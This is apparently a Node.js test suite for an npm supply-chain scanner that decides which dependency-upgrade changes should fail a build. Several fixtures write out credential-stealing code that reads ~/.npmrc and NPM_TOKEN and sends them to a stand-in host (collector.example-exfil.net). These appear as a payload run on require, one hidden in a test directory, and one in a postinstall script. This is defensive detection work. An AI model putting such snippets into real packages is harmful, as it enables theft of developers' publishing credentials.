'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

const { diffManifests } = require('../lib/diff');
const { scanPackageDir } = require('../lib/scanner');
const { mkTmpDir, writePackage } = require('./helpers');

function scan(tmp, relDir, pkgJson, files) {
  return scanPackageDir(writePackage(tmp, relDir, pkgJson, files));
}

// What fails a build and what is only reported. These rules come from
// upgrading 14 popular packages to their current versions and looking at
// every escalation that produced: 16 of 16 were routine library evolution
// (build-tooling swaps, NO_COLOR support, documentation URLs). A gate that
// fires 16 times on an ordinary upgrade gets switched off, so each of those
// classes is reported without failing, while the signals that indicate an
// actual attack path still fail.
describe('what escalates on a routine dependency upgrade', () => {
  test('a changed prepare script is reported but does not escalate', () => {
    const tmp = mkTmpDir('gate-prepare');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { prepare: 'husky install' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { prepare: 'tshy' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(report.changes.some((c) => c.type === 'lifecycle-script-changed' && c.escalates === false));
  });

  test('a changed postinstall script does escalate', () => {
    const tmp = mkTmpDir('gate-postinstall');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { postinstall: 'node build.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { postinstall: 'node other.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('newly reading a non-credential env var is reported but does not escalate', () => {
    const tmp = mkTmpDir('gate-env-benign');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'if (process.env.NO_COLOR) {}\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(report.changes.some((c) => c.type === 'new-env-vars' && c.escalates === false));
  });

  test('newly reading a credential-shaped env var does escalate', () => {
    const tmp = mkTmpDir('gate-env-credential');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'const t = process.env.MY_SECRET_TOKEN;\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('a new endpoint with no install script or credential access does not escalate', () => {
    const tmp = mkTmpDir('gate-endpoint-docs');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    // A documentation link in an error message, the shape seen on real upgrades.
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': "throw new Error('see https://example.com/docs/errors for details');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
  });

  test('a new endpoint in a package that also runs at install time does escalate', () => {
    const tmp = mkTmpDir('gate-endpoint-exfil');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { postinstall: 'node s.js' } }, {
      's.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { postinstall: 'node s.js' } }, {
      's.js': "require('https').request('https://collector.example.net/beacon');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('the env capability appearing on its own does not escalate', () => {
    const tmp = mkTmpDir('gate-env-category');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'const p = process.env.no_proxy;\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(
      report.changes.some((c) => c.type === 'capability-added' && c.category === 'env' && c.escalates === false)
    );
  });

  test('network capability appearing on its own still escalates', () => {
    const tmp = mkTmpDir('gate-network-category');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': "const https = require('https');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('a cache-fill method named fetch is not network access', () => {
    // lru-cache's fetch(k, opts) made lru-cache and everything bundling it
    // read as having network access.
    const tmp = mkTmpDir('fetch-method');
    const m = scan(tmp, 'pkg', { name: 'cache', version: '1.0.0' }, {
      'index.js': 'class C {\n  async fetch(k, opts = {}) { return this.#fetch(k, opts); }\n}\n',
    });
    assert.equal(m.capabilities.network.present, false);
  });

  test('real uses of the fetch web API are still network access', () => {
    const tmp = mkTmpDir('fetch-real');
    for (const src of [
      "const r = await fetch(url);\n",
      "fetch('https://example.com/api');\n",
      'globalThis.fetch(u);\n',
    ]) {
      const m = scan(tmp, 'pkg-' + Math.random().toString(36).slice(2), { name: 'p', version: '1.0.0' }, {
        'index.js': src,
      });
      assert.equal(m.capabilities.network.present, true, `should detect network in: ${src}`);
    }
  });
});

// The two attack shapes that survive npm 12 blocking install scripts by
// default. Neither involves a lifecycle script at all, so a tool scoped to
// install scripts reports nothing on either. Verified against
// npm-script-lens 1.16.0: it reports the first fixture as "no risky
// install-time behavior".
describe('attack shapes with no install script', () => {
  test('a payload that runs on require is caught as an escalation', () => {
    const tmp = mkTmpDir('runtime-payload');
    const before = scan(tmp, 'v1', { name: 'helper', version: '3.1.0' }, {
      'index.js': 'module.exports = { f: (x) => x };\n',
    });
    const after = scan(tmp, 'v2', { name: 'helper', version: '3.1.1' }, {
      'index.js': [
        "const fs = require('fs');",
        "const https = require('https');",
        "const creds = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');",
        "https.request('https://collector.example-exfil.net/x', { method: 'POST' }).end(creds + process.env.NPM_TOKEN);",
        'module.exports = { f: (x) => x };',
        '',
      ].join('\n'),
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
    assert.ok(report.newRiskFlags.some((f) => f.startsWith('HIGH')));
  });

  // flatmap-stream, the event-stream attack, hid its payload in a test
  // directory precisely because that directory was absent from the GitHub
  // repo, so the published tarball differed from the reviewable source.
  // Skipping test/ made this fixture pass the gate with exit 0.
  test('a payload hidden in a test directory is still scanned', () => {
    const tmp = mkTmpDir('test-dir-payload');
    const before = scan(tmp, 'v1', { name: 'streamy', version: '0.1.0' }, {
      'index.js': 'module.exports = (f) => f;\n',
    });
    const after = scan(tmp, 'v2', { name: 'streamy', version: '0.1.1' }, {
      'index.js': 'module.exports = (f) => f;\n',
      'test/data.js': [
        "const fs = require('fs');",
        "const https = require('https');",
        "const creds = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');",
        "https.request('https://collector.example-exfil.net/x').end(creds + process.env.NPM_TOKEN);",
        '',
      ].join('\n'),
    });
    assert.equal(after.capabilities.sensitiveTargets.present, true, 'test/ must be scanned');
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });
});

// Found by scanning got's real 1039-package tree: esbuild's postinstall
// downloads its own binary from the npm registry and reads
// ESBUILD_BINARY_PATH. That is install-time code plus network plus env,
// which was enough to label it a self-propagating worm. The worm pattern
// reads credentials; esbuild reads its own configuration.
describe('CRITICAL requires credential access, not any env access', () => {
  test('an install script that downloads its own binary is HIGH, not CRITICAL', () => {
    const tmp = mkTmpDir('esbuild-shape');
    const m = scan(tmp, 'pkg', { name: 'bundler', version: '1.0.0', scripts: { postinstall: 'node install.js' } }, {
      'install.js': [
        "const https = require('https');",
        "const cp = require('child_process');",
        "const custom = process.env.BUNDLER_BINARY_PATH;",
        "https.get('https://registry.npmjs.org/bundler-binary/-/bundler-binary-1.0.0.tgz');",
        '',
      ].join('\n'),
    });
    assert.ok(!m.riskFlags.some((f) => f.startsWith('CRITICAL')), 'must not be called a worm');
    assert.ok(m.riskFlags.some((f) => f.startsWith('HIGH')), 'still worth an allowlist decision');
  });

  test('the same shape reading credentials is CRITICAL', () => {
    const tmp = mkTmpDir('worm-shape');
    const m = scan(tmp, 'pkg', { name: 'evil', version: '1.0.0', scripts: { postinstall: 'node install.js' } }, {
      'install.js': [
        "const https = require('https');",
        "const token = process.env.NPM_TOKEN;",
        "https.request('https://collector.example-exfil.net/x').end(token);",
        '',
      ].join('\n'),
    });
    assert.ok(m.riskFlags.some((f) => f.startsWith('CRITICAL')));
  });
});
